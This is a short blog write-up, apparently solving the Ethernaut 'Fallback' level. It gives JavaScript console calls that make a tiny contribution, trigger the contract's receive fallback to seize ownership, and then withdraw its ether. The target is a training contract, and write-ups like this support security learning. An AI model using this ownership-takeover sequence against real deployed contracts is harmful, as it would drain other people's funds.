+++
title = 'Ethernaut Level 1 - Fallback'
draft = false

featured_image =  '/images/ethernaut.png'
background_image= '/images/ethernaut.png'
summary = 'First level to introduce interacting with the Levels'
date = 2024-04-08 01:00:00
tags = [ 'writeups' , 'blockchain', 'ethernaut']
+++
1. Use the contribute function to send eth
2. Use standard function to send eth

```js
// Send via Contract ABI
contract.contribute({value:1});
// Check if eth is send
Number(await contract.getContribution());
// Triger `receive` function via normal transaction
sendTransaction({from:player, to:contract.address, value:1});
// 4. PROFIT!!!!
await contract.withdraw();
```